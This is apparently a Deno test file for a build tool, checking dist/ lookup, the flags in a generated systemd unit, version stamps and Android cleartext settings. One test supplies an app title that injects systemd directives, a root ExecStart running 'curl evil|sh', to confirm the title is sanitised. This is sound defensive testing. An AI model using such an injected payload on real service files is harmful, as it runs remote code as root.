  ]);
});

Deno.test("compileArgs: output + entry are last, dist omitted when absent", () => {
  const args = compileArgs({
    hasDist: false,
    workerInclude: [],
    assets: [],
    excludes: [],
    out: "bin",
    entry: "src/app.ts",
  });
  // `-q` sits with `compile`: deno otherwise prints an "Embedded Files" tree
  // of every module in the bundle — hundreds of lines for an app with three of
  // its own — while the build already reports the artifact and its size on one
  // line. Diagnostics are unaffected, so a compile that FAILS still says why.
  assertEquals(args, ["compile", "-q", "-A", "-o", "bin", "src/app.ts"]);
});

Deno.test("distCandidates: entry-relative BEFORE the filesystem (portability)", () => {
  const c = distCandidates({
    mainModule: "file:///tmp/deno-compile-myapp/app/src/app.ts",
    cwd: "/somewhere/else",
    execDir: "/usr/local/bin",
    moduleDir: "/proj/dep/aio/src/server",
  });
  // The embedded dist/ (next to the entry in the VFS) must win: it's the only
  // candidate that holds when the binary is run from an arbitrary cwd.
  assertEquals(c[0], "/tmp/deno-compile-myapp/app/dist");
  assertEquals(c[1], "/tmp/deno-compile-myapp/app/src/dist");
  // …filesystem probes stay as fallbacks (Electron AppDir ships a real dist/).
  assert(c.includes("/somewhere/else/dist"), "cwd fallback kept");
  assert(c.includes("/usr/local/bin/dist"), "exec dir fallback kept");
  const cwdIdx = c.indexOf("/somewhere/else/dist");
  assert(cwdIdx > 1, "cwd must NOT be probed before the embedded dist");
});

Deno.test("realDistCandidates: never the compile VFS (Electron blank window)", () => {
  const opts = {
    mainModule: "file:///tmp/deno-compile-myapp/app/src/app.ts",
    cwd: "/mnt/appimage",
    execDir: "/mnt/appimage",
    moduleDir: "/proj/dep/aio/src/server",
  };
  const real = realDistCandidates(opts);
  // The embedded VFS path resolves fine via Deno.stat but does NOT exist for
  // Electron — passing it as the aio:// base silently fell back to a localhost
  // URL that prod had already refused to bind. It must never appear here.
  assert(
    real.every((d) => !d.includes("deno-compile-")),
    `no VFS path may reach a foreign process; got: ${real.join(", ")}`,
  );
  assertEquals(real[0], "/mnt/appimage/dist");
  // …and prod-detection keeps the VFS candidates, first, as before.
  assertEquals(distCandidates(opts)[0], "/tmp/deno-compile-myapp/app/dist");
  assertEquals(distCandidates(opts).slice(-real.length), real);
});

Deno.test("distCandidates: a NESTED entry still finds the embedded dist/", () => {
  // R-5: the two hardcoded guesses (`../dist`, `./dist`) assumed an
  // entry exactly one level down. A relay at `src/server/app.ts` — one repo,
  // three apps — probed `src/dist` and `src/server/dist`, missed the embedded
  // copy, and the SHIPPED binary served the "Headless build — no browser UI"
  // page. Dev was fine, the compile succeeded, and the failure arrived as a
  // 503 the first time anyone opened the artifact.
  const c = distCandidates({
    mainModule: "file:///tmp/deno-compile-relay/app/src/server/app.ts",
    cwd: "/elsewhere",
    execDir: "/usr/local/bin",
    moduleDir: null,
  });
  assert(
    c.includes("/tmp/deno-compile-relay/app/dist"),
    `the embedded dist/ must be a candidate; got: ${c.join(", ")}`,
  );
  // …and every level in between, so no depth is a special case.
  assert(c.includes("/tmp/deno-compile-relay/app/src/dist"));
  assert(c.includes("/tmp/deno-compile-relay/app/src/server/dist"));
  // The walk stops at the filesystem root instead of looping.
  assert(c.length < 20, `candidate list must stay bounded, got ${c.length}`);
  // Real-filesystem probes still come last (Electron reads a real dist/).
  assert(
    c.indexOf("/elsewhere/dist") >
      c.indexOf("/tmp/deno-compile-relay/app/dist"),
    "entry-relative candidates must precede the filesystem ones",
  );
});

Deno.test("distCandidates: survives a non-file mainModule, no dupes", () => {
  const c = distCandidates({
    mainModule: "https://example.com/app.ts",
    cwd: "/app",
    execDir: "/app",
    moduleDir: null,
  });
  // No entry-relative candidates, but the fallbacks must still be produced —
  // never an empty list (that would make prod undetectable).
  assert(c.length > 0, "fallbacks survive an unparseable entry");
  assert(c.includes("/app/dist"));
});

// ── the generated systemd unit's flags must be REAL runtime flags ────────────
// `compile:service` writes a unit users copy verbatim into
// /etc/systemd/system. It shipped `--headless` — a BUILD flag the binary does
// not parse — so the service silently started in the default (electron) client
// mode and crashed. Feeding the unit's flags through the real CLI parser is the
// cheap proof that never happens again.

import { serviceExecFlags } from "../src/build/build-compile.ts";
import { parseCli } from "../src/server/aio-cli.ts";

Deno.test("serviceExecFlags: headless service parses as a server-only server", () => {
  const flags = serviceExecFlags({ doRemote: false, doHeadless: true });
  const cli = parseCli(flags);
  assertEquals(cli.client, "server-only", "unit must select server-only mode");
  assertEquals(cli.port, 3000);
  assert(!flags.includes("--headless"), "--headless is not a runtime flag");
});

Deno.test("serviceExecFlags: remote service exposes the server", () => {
  const cli = parseCli(serviceExecFlags({ doRemote: true, doHeadless: true }));
  assertEquals(cli.expose, true);
  assertEquals(cli.client, "server-only");
});

Deno.test("serviceExecFlags: a UI service stays on the default client", () => {
  const cli = parseCli(
    serviceExecFlags({ doRemote: false, doHeadless: false }),
  );
  assertEquals(cli.client, undefined, "non-headless keeps the app's default");
  assertEquals(cli.expose, undefined);
});

Deno.test("serviceExecFlags: every emitted flag is understood by the CLI", () => {
  // parseCli warns and IGNORES unknown flags, so an unparsed flag is invisible
  // at runtime — assert each one actually lands in the parsed result.
  for (const doRemote of [false, true]) {
    for (const doHeadless of [false, true]) {
      const flags = serviceExecFlags({ doRemote, doHeadless, port: 8080 });
      const cli = parseCli(flags);
      assertEquals(cli.port, 8080, `--port ignored for ${flags}`);
      assertEquals(cli.expose, doRemote || undefined);
      assertEquals(cli.client, doHeadless ? "server-only" : undefined);
    }
  }
});

// ── the bundle carries (and is invalidated by) its aio version ───────────────
// A framework upgrade that leaves dist/app.js in place ships a client speaking
// the OLD wire protocol against a NEW server — the "some parts speak v2, some
// v1" failure. The bundle is stamped with the aio version that built it, so the
// artifact is self-describing and the cache can't outlive its framework.

import { versionStamp } from "../src/build/build-bundle.ts";
import { VERSION } from "../src/server/aio-cli.ts";
import {
  negotiateProtocol,
  parseProtoHello,
  protoHello,
  stampedVersion,
  VERSION_STAMP,
} from "../src/protocol/protocol-version.ts";

Deno.test("versionStamp: assigns the building aio version to the shared global", () => {
  const stamp = versionStamp("9.9.9-test");
  assertStringIncludes(stamp, VERSION_STAMP);
  assertStringIncludes(stamp, '"9.9.9-test"');
  // The stamp must be executable JS that the runtime reader picks up.
  const g = globalThis as Record<string, unknown>;
  const prev = g[VERSION_STAMP];
  try {
    new Function(stamp)();
    assertEquals(stampedVersion(), "9.9.9-test");
  } finally {
    if (prev === undefined) delete g[VERSION_STAMP];
    else g[VERSION_STAMP] = prev;
  }
});

Deno.test("versionStamp: a bundle from another aio version is not a match", () => {
  // What isBundleFresh greps for: this build's stamp, present verbatim.
  const current = versionStamp(VERSION).trim();
  const older = `globalThis.${VERSION_STAMP} = "1.0.0-alpha1";`;
  assert(!older.includes(current), "an older bundle must not look current");
  assert(
    `${older}\nconsole.log(1)\n${current}\n`.includes(current),
    "a current bundle is recognized wherever the stamp sits",
  );
});

// ── a protocol mismatch must name the stale ARTIFACT, not just the numbers ───

Deno.test("proto: hello carries the aio build version (round-trips)", () => {
  const hello = protoHello("1.0.0-alpha33");
  assertEquals(hello.ver, "1.0.0-alpha33");
  assertEquals(parseProtoHello(JSON.stringify(hello))?.ver, "1.0.0-alpha33");
  // Omitted by peers built before the field existed — never fabricated.
  assertEquals(protoHello().ver, undefined);
  assertEquals(parseProtoHello('{"v":2,"min":2}')?.ver, undefined);
});

Deno.test("proto: a hostile `ver` can't flood the logs", () => {
  const long = "x".repeat(500);
  assertEquals(
    parseProtoHello(`{"v":2,"min":2,"ver":"${long}"}`)?.ver,
    undefined,
  );
  assertEquals(parseProtoHello('{"v":2,"min":2,"ver":123}')?.ver, undefined);
});

Deno.test("proto: mismatch reason names which side is old and its version", () => {
  // An old server (v1) meeting a new client that requires v2 — the exact
  // report from the field: the message must say THIS side is the stale one.
  const oldServer = negotiateProtocol(
    { v: 1, min: 1, ver: "1.0.0-alpha28" },
    { v: 2, min: 2, ver: "1.0.0-alpha33" },
  );
  assertEquals(oldServer.ok, false);
  if (!oldServer.ok) {
    assertStringIncludes(oldServer.reason, "THIS side is the older build");
    assertStringIncludes(oldServer.reason, "aio 1.0.0-alpha28");
    assertStringIncludes(oldServer.reason, "aio 1.0.0-alpha33");
  }
  // …and the mirror case blames the peer.
  const oldPeer = negotiateProtocol(
    { v: 2, min: 2, ver: "1.0.0-alpha33" },
    { v: 1, min: 1, ver: "1.0.0-alpha28" },
  );
  assertEquals(oldPeer.ok, false);
  if (!oldPeer.ok) {
    assertStringIncludes(oldPeer.reason, "PEER is the older build");
  }
  // A peer that doesn't announce a version still yields a readable reason.
  const unknown = negotiateProtocol({ v: 2, min: 2 }, { v: 1, min: 1 });
  assertEquals(unknown.ok, false);
  if (!unknown.ok) {
    assertStringIncludes(unknown.reason, "an unknown aio version");
  }
});

// systemd units are line-oriented, so a newline in `deno.json`'s title
// starts a new DIRECTIVE. A title of "My App\nExecStart=…\nUser=root" produced
// a unit that ran something else as root on the machine the operator installs
// it on. `binaryName` was already slugified; `appTitle` is free text.
Deno.test("writeServiceFile: a title cannot inject systemd directives", async () => {
  const { writeServiceFile } = await import("../src/build/build-compile.ts");
  const dir = await Deno.makeTempDir({ prefix: "aio-unit-" });
  const cwd = Deno.cwd();
  try {
    Deno.chdir(dir);
    await writeServiceFile(
      {
        binaryName: "myapp",
        appTitle:
          "Evil\nExecStart=/bin/sh -c 'curl evil|sh'\nUser=root\n[Service]",
        doRemote: false,
        doHeadless: true,
        // deno-lint-ignore no-explicit-any
      } as any,
    );
    const unit = await Deno.readTextFile(`${dir}/myapp.service`);
    const directives = unit.split("\n").filter((l) => /^ExecStart=/.test(l));
    assertEquals(
      directives.length,
      1,
      `exactly one ExecStart must exist:\n${unit}`,
    );
    assert(
      directives[0]!.includes("/usr/local/bin/myapp"),
      "and it must be the real binary",
    );
    assert(!/^User=root$/m.test(unit), `no injected User= line:\n${unit}`);
    assert(
      unit.includes("Description=Evil ExecStart="),
      `the title survives, flattened onto one line:\n${unit}`,
    );
  } finally {
    Deno.chdir(cwd);
    await Deno.remove(dir, { recursive: true }).catch(() => {});
  }
});

// Cleartext is ONE decision, and the client APK is on the wrong side of it.
//
// Android blocks cleartext from targetSdk 28; this template is 34. The
// attribute that permits it used to be injected by the `dev:android` rewrite
// and nowhere else, so the dev loop reached a plain-http server and the
// `--android --remote` client APK that loop exists to produce could not reach
// the same one — `net::ERR_CLEARTEXT_NOT_PERMITTED` on a target whose entire
// UI is a box for the server's URL, and whose documented server is `--expose`,
// which serves plain http unless `tls` is set. One decider now, and a
// standalone APK still gets nothing: it has no server to reach.
Deno.test("android manifest: cleartext is permitted exactly where a server is dialled", () => {
  assertEquals(
    _cleartextAttr({ remote: true }),
    'android:usesCleartextTraffic="true"',
    "the client APK's whole purpose is a plain-http LAN server",
  );
  assertEquals(
    _cleartextAttr({ devUrl: "http://127.0.0.1:8000" }),
    'android:usesCleartextTraffic="true"',
    "dev:android reaches the dev server over adb reverse",
  );
  assertEquals(
    _cleartextAttr({}),
    "",
    "a standalone APK loads packaged assets over https and dials nothing — " +
      "cleartext would be permission for nothing",
  );
  assertEquals(_cleartextAttr({ devUrl: null, remote: false }), "");
});

// The other half: the manifest must actually HAVE the hole this fills, and
// must not carry a second, hardcoded spelling of the answer.
Deno.test("android manifest: the template asks for the cleartext decision", () => {
  const manifest = ANDROID_TEMPLATE["app/src/main/AndroidManifest.xml"]!;
  assert(
    manifest.includes("{{CLEARTEXT_ATTR}}"),
    "the placeholder is where the decider's answer lands",
  );
  assertEquals(
    /usesCleartextTraffic/.test(manifest.replace("{{CLEARTEXT_ATTR}}", "")),
    false,
    "a hardcoded attribute would answer the question twice",
  );
  // Every placeholder in the manifest must be substituted by the build. An
  // unreplaced `{{…}}` is not a warning — aapt2 fails, or worse, ships.
  const src = Deno.readTextFileSync(
    new URL("../src/build/build-android.ts", import.meta.url),
  );
  for (const ph of new Set(manifest.match(/\{\{[A-Z_]+\}\}/g) ?? [])) {
    assert(
      src.includes(`"${ph}"`),
      `${ph} is in the manifest template with nothing in build-android.ts to ` +
        `replace it`,
    );
  }
});
